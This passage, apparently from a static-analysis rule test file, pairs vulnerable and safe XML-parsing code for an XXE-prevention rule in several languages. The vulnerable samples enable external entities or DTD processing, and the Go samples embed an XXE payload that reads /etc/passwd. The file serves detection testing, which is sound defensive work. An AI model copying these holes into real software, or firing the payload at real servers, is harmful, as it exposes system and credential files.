    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "function handleXmlUpload ({ file }: Request, res: Response, next: NextFunction) {\n    // ok: express-libxml-vm-noent\n    libxml.parseXml(data, { noblanks: true, nocdata: true })\n}",
    "language": "javascript",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "const expat = require('xml2json');\n\nfunction test1() {\n    var winston = require('winston'),\n        express = require('express');\n\n    var xmlParsingMiddleware = function(req, res, next) {\n        var buf = '';\n        req.setEncoding('utf8');\n        req.on('data', function (chunk) {\n            buf += chunk\n        });\n        // ruleid: express-xml2json-xxe-event\n        req.on('end', function () {\n            req.body = expat.toJson(buf, {coerce: true, object: true});\n            next();\n        });\n    };\n}",
    "language": "javascript",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "function okTest() {\n    const express = require('express')\n    const app = express()\n    const port = 3000\n    const someEvent = require('some-event')\n\n    // ok: express-xml2json-xxe-event\n    someEvent.on('event', function (err, data) {\n        req.body = expat.toJson(data, {coerce: true, object: true});\n        next();\n    });\n\n    app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))\n}",
    "language": "javascript",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "def bad():\n    # ruleid: use-defused-xml\n    import xml\n    # ruleid: use-defused-xml\n    from xml.etree import ElementTree\n    tree = ElementTree.parse('country_data.xml')\n    root = tree.getroot()",
    "language": "python",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "def ok():\n    # ok: use-defused-xml\n    import defusedxml\n    # ok: use-defused-xml\n    from defusedxml.etree import ElementTree\n    tree = ElementTree.parse('country_data.xml')\n    root = tree.getroot()",
    "language": "python",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "def bad(input_string):\n    # ok: use-defused-xml-parse\n    import xml\n    # ok: use-defused-xml-parse\n    from xml.etree import ElementTree\n    tree = ElementTree.parse('country_data.xml')\n    root = tree.getroot()\n\n    # ruleid: use-defused-xml-parse\n    tree = ElementTree.parse(input_string)",
    "language": "python",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "def ok():\n    # ok: use-defused-xml-parse\n    import defusedxml\n    # ok: use-defused-xml-parse\n    from defusedxml.etree import ElementTree\n    tree = ElementTree.parse('country_data.xml')\n    root = tree.getroot()\n\n    # ok: use-defused-xml-parse\n    tree = ElementTree.parse(input_string)",
    "language": "python",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "from twilio.rest import Client\n\nclient = Client(\"accountSid\", \"authToken\")\nXML = \"<Response><Say>{}</Say><Hangup/></Response>\"\n\ndef fstring(to: str, msg: str) -> None:\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=f\"<Response><Say>{msg}</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\ndef format_const(to: str, msg: str) -> None:\n    twiml = XML.format(msg)\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=twiml,\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\ndef percent(to: str, msg: str) -> None:\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=\"<Response><Say>%s</Say><Hangup/></Response>\" % msg,\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\ndef concat(to: str, msg: str) -> None:\n    client.calls.create(\n        # ruleid: twiml-injection\n        twiml=\"<Response><Say>\" + msg + \"</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )",
    "language": "python",
    "description": "vulnerable to XML injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "import html\nfrom xml.sax.saxutils import escape\n\ndef safe(to: str, msg: str) -> None:\n    client.calls.create(\n        # ok: twiml-injection\n        twiml=\"<Response><Say>nsec</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\ndef html_escape(to: str, msg: str) -> None:\n    client.calls.create(\n        # ok: twiml-injection\n        twiml=\"<Response><Say>\" + html.escape(msg) + \"</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )\n\ndef xml_escape(to: str, msg: str) -> None:\n    client.calls.create(\n        # ok: twiml-injection\n        twiml=\"<Response><Say>\" + escape(msg) + \"</Say><Hangup/></Response>\",\n        to=to,\n        from_=\"555-555-5555\",\n    )",
    "language": "python",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "require 'xml'\nrequire 'libxml'\n\n# ruleid: libxml-backend\nActiveSupport::XmlMini.backend = 'LibXML'",
    "language": "ruby",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "require 'xml'\nrequire 'libxml'\n\n# ok: libxml-backend\nActiveSupport::XmlMini.backend = 'REXML'\n\n# ok: libxml-backend\nActiveSupport::XmlMini.backend = 'Nokogiri'\n\n# Deny entity replacement in LibXML parsing\nLibXML::XML.class_eval do\n  def self.default_substitute_entities\n    XML.default_substitute_entities = false\n  end\nend",
    "language": "ruby",
    "description": "safe usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "require 'xml'\nrequire 'libxml'\n\n# Change the ActiveSupport XML backend from REXML to LibXML\nActiveSupport::XmlMini.backend = 'LibXML'\n\nLibXML::XML.class_eval do\n  def self.default_substitute_entities\n    # ruleid: xml-external-entities-enabled\n    XML.default_substitute_entities = true\n  end\nend",
    "language": "ruby",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "LibXML::XML.class_eval do\n  def self.default_substitute_entities\n    # ok: xml-external-entities-enabled\n    XML.default_substitute_entities = false\n  end\nend",
    "language": "ruby",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "public class Foo{\n    public void LoadBad(string input)\n    {\n        string fileName = @\"C:\\Users\\user\\Documents\\test.xml\";\n        XmlDocument xmlDoc = new XmlDocument();\n        xmlDoc.XmlResolver = new XmlUrlResolver();\n        // ruleid: xmldocument-unsafe-parser-override\n        xmlDoc.Load(input);\n        Console.WriteLine(xmlDoc.InnerText);\n\n        Console.ReadLine();\n    }\n\n    public static void StaticLoadBad(string input)\n    {\n        string fileName = @\"C:\\Users\\user\\Documents\\test.xml\";\n        XmlDocument xmlDoc = new XmlDocument();\n        xmlDoc.XmlResolver = new XmlUrlResolver();\n        // ruleid: xmldocument-unsafe-parser-override\n        xmlDoc.Load(input);\n        Console.WriteLine(xmlDoc.InnerText);\n\n        Console.ReadLine();\n    }\n}",
    "language": "csharp",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "public class Foo{\n    public void LoadGood(string input)\n    {\n        XmlDocument xmlDoc = new XmlDocument();\n        // ok: xmldocument-unsafe-parser-override\n        xmlDoc.Load(input);\n        Console.WriteLine(xmlDoc.InnerText);\n\n        Console.ReadLine();\n    }\n}",
    "language": "csharp",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "public void ParseBad(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    // ruleid:xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n\n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}\n\npublic void ParseBad2(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Parse;\n\n    // ruleid:xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(input,rs);\n\n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}",
    "language": "csharp",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "public void ParseGood(string input){\n    XmlReaderSettings rs = new XmlReaderSettings();\n    rs.DtdProcessing = DtdProcessing.Ignore;\n\n    // ok: xmlreadersettings-unsafe-parser-override\n    XmlReader myReader = XmlReader.Create(new StringReader(input),rs);\n\n    while (myReader.Read())\n    {\n        Console.WriteLine(myReader.Value);\n    }\n    Console.ReadLine();\n}",
    "language": "csharp",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "namespace SomeNamespace{\n    public class Foo{\n        public void ReaderBad(string userInput)\n        {\n            XmlTextReader myReader = new XmlTextReader(new StringReader(userInput));\n\n            // ruleid: xmltextreader-unsafe-defaults\n            while (myReader.Read())\n            {\n                if (myReader.NodeType == XmlNodeType.Element)\n                {\n                    // ruleid: xmltextreader-unsafe-defaults\n                    Console.WriteLine(myReader.ReadElementContentAsString());\n                }\n            }\n            Console.ReadLine();\n        }\n    }\n}",
    "language": "csharp",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "public void ReaderGood(string userInput)\n{\n    XmlTextReader myReader = new XmlTextReader(new StringReader(userInput));\n    myReader.DtdProcessing = DtdProcessing.Prohibit;\n    // ok: xmltextreader-unsafe-defaults\n    while (myReader.Read())\n    {\n        if (myReader.NodeType == XmlNodeType.Element)\n        {\n            // ok: xmltextreader-unsafe-defaults\n            Console.WriteLine(myReader.ReadElementContentAsString());\n        }\n    }\n    Console.ReadLine();\n}",
    "language": "csharp",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "package org.test.test\n\nimport java.io.{File, FileReader}\nimport javax.xml.stream.XMLInputFactory\n\nclass Foo {\n\n  def run1(file: String) = {\n    // ruleid: xmlinputfactory-dtd-enabled\n    val factory = XMLInputFactory.newInstance()\n    val fileReader = new FileReader(file)\n    val xmlReader = factory.createXMLStreamReader(fileReader)\n    doSmth(xmlReader)\n  }\n\n  def run2(file: String) = {\n    // ruleid: xmlinputfactory-dtd-enabled\n    val factory = XMLInputFactory.newFactory()\n    val fileReader = new FileReader(file)\n    val xmlReader = factory.createXMLStreamReader(fileReader)\n    doSmth(xmlReader)\n  }\n}",
    "language": "scala",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class Foo {\n\n  def okRun1(file: String) = {\n    // ok: xmlinputfactory-dtd-enabled\n    val factory = XMLInputFactory.newInstance\n    factory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false)\n    val fileReader = new FileReader(file)\n    val xmlReader = factory.createXMLStreamReader(fileReader)\n    doSmth(xmlReader)\n  }\n\n  def okRun2(file: String) = {\n    // ok: xmlinputfactory-dtd-enabled\n    val factory = XMLInputFactory.newFactory()\n    factory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false)\n    val fileReader = new FileReader(file)\n    val xmlReader = factory.createXMLStreamReader(fileReader)\n    doSmth(xmlReader)\n  }\n}",
    "language": "scala",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "package org.test.test\n\nimport java.io.File\nimport org.dom4j.io.SAXReader\nimport org.dom4j.{Document}\nimport javax.xml.parsers.SAXParserFactory\n\nclass Foo {\n\n  def run1(xmlFilePath:String) = {\n    val file = new File(xmlFilePath)\n    // ruleid: sax-dtd-enabled\n    val saxReader = new SAXReader()\n    val doc = Try(saxReader.read(file))\n    result.asInstanceOf[Document]\n  }\n\n  def run2(xmlFilePath:String) = {\n    val file = new File(xmlFilePath)\n    // ruleid: sax-dtd-enabled\n    val factory = SAXParserFactory.newInstance()\n    val saxReader = factory.newSAXParser()\n    val doc = Try(saxReader.read(file))\n    result.asInstanceOf[Document]\n  }\n\n  def run4(xmlFilePath:String) = {\n    val file = new File(xmlFilePath)\n    // ruleid: sax-dtd-enabled\n    val saxReader = SAXParserFactory.newInstance().newSAXParser()\n    val doc = Try(saxReader.read(file))\n    result.asInstanceOf[Document]\n  }\n}",
    "language": "scala",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class Foo {\n\n  def okRun1(xmlFilePath:String) = {\n    val file = new File(xmlFilePath)\n    // ok: sax-dtd-enabled\n    val saxReader = new SAXReader()\n\n    saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n    saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false)\n    saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false)\n\n    val doc = Try(saxReader.read(file))\n    result.asInstanceOf[Document]\n  }\n\n  def okRun2(xmlFilePath:String) = {\n    val file = new File(xmlFilePath)\n    // ok: sax-dtd-enabled\n    val factory = SAXParserFactory.newInstance()\n    val saxReader = factory.newSAXParser()\n\n    saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false)\n    saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n    saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false)\n\n    val doc = Try(saxReader.read(file))\n    result.asInstanceOf[Document]\n  }\n}",
    "language": "scala",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "package org.test.test\n\nimport java.io.File\nimport javax.xml.parsers.DocumentBuilder\nimport javax.xml.parsers.DocumentBuilderFactory\n\nclass Foo {\n\n  def run1(file: File) = {\n    // ruleid: documentbuilder-dtd-enabled\n    val docBuilderFactory = DocumentBuilderFactory.newInstance()\n    val docBuilder = docBuilderFactory.newDocumentBuilder()\n    val doc = docBuilder.parse(file)\n    doc.getDocumentElement().normalize()\n    val foobarList = doc.getElementsByTagName(\"Foobar\")\n    foobarList\n  }\n\n  def run2(file: File) = {\n    // ruleid: documentbuilder-dtd-enabled\n    val docBuilder = DocumentBuilderFactory.newInstance().newDocumentBuilder()\n    val doc = docBuilder.parse(file)\n    doc.getDocumentElement().normalize()\n    val foobarList = doc.getElementsByTagName(\"Foobar\")\n    foobarList\n  }\n}",
    "language": "scala",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "class Foo {\n\n  def okRun1(file: File) = {\n    // ok: documentbuilder-dtd-enabled\n    val docBuilderFactory = DocumentBuilderFactory.newInstance()\n    val docBuilder = docBuilderFactory.newDocumentBuilder()\n\n    docBuilder.setXIncludeAware(true)\n    docBuilder.setNamespaceAware(true)\n\n    docBuilder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true)\n    docBuilder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false)\n    docBuilder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false)\n\n    val doc = docBuilder.parse(file)\n    doc.getDocumentElement().normalize()\n    val foobarList = doc.getElementsByTagName(\"Foobar\")\n    foobarList\n  }\n}",
    "language": "scala",
    "description": "XXE disabled"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "bad",
    "code": "import (\n\t\"fmt\"\n\t\"github.com/lestrrat-go/libxml2/parser\"\n)\n\nfunc vuln() {\n\tconst s = \"<!DOCTYPE d [<!ENTITY e SYSTEM \\\"file:///etc/passwd\\\">]><t>&e;</t>\"\n\t// ruleid: parsing-external-entities-enabled\n\tp := parser.New(parser.XMLParseNoEnt)\n\tdoc, err := p.ParseString(s)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\tfmt.Println(\"Doc successfully parsed!\")\n\tfmt.Println(doc)\n}",
    "language": "go",
    "description": "vulnerable to XXE"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent XML External Entity (XXE) Injection",
    "type": "good",
    "code": "func not_vuln() {\n\tconst s = \"<!DOCTYPE d [<!ENTITY e SYSTEM \\\"file:///etc/passwd\\\">]><t>&e;</t>\"\n\t// ok: parsing-external-entities-enabled\n\tp := parser.New()\n\tdoc, err := p.ParseString(s)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\tfmt.Println(\"Doc successfully parsed!\")\n\tfmt.Println(doc)\n}",
    "language": "go",
    "description": "XXE disabled"
  }
]